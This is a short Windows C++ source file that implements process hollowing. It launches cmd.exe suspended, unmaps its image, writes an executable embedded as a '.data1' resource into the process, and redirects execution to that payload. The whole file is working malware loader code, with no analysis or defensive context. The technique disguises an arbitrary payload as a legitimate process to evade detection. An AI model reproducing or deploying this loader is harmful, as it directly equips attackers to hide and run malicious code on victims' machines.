#include <windows.h>

extern "C" NTSYSAPI LONG NTAPI ZwUnmapViewOfSection(HANDLE, PVOID);

ULONG protect(ULONG characteristics)
{
    static const ULONG mapping[]
        = {PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ,
           PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};

    return mapping[characteristics >> 29];
}

int main(int argc, char *argv[])
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si = {sizeof si};

    CreateProcess(0, "cmd", 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi);

    CONTEXT context = {CONTEXT_INTEGER};
    GetThreadContext(pi.hThread, &context);

    PVOID x; ReadProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, &x, sizeof x, 0);
    ZwUnmapViewOfSection(pi.hProcess, x);

    /* Rewrite this compiled binary to include a ".data1" section. */
    PVOID p = LockResource(LoadResource(0, FindResource(0, ".data1", "EXE")));
    PIMAGE_NT_HEADERS nt = PIMAGE_NT_HEADERS(PCHAR(p) + PIMAGE_DOS_HEADER(p)->e_lfanew);
    PVOID q = VirtualAllocEx(pi.hProcess,
                             PVOID(nt->OptionalHeader.ImageBase),
                             nt->OptionalHeader.SizeOfImage,
                             MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(pi.hProcess, q, p, nt->OptionalHeader.SizeOfHeaders, 0);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

    for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
                           PCHAR(q) + sect[i].VirtualAddress,
                           PCHAR(p) + sect[i].PointerToRawData,
                           sect[i].SizeOfRawData, 0);

        ULONG x;
        VirtualProtectEx(pi.hProcess, PCHAR(q) + sect[i].VirtualAddress, sect[i].Misc.VirtualSize,
                         protect(sect[i].Characteristics), &x);
    }

    WriteProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, &q, sizeof q, 0);
    context.Eax = ULONG(q) + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &context);
    ResumeThread(pi.hThread);

    return 0;
}

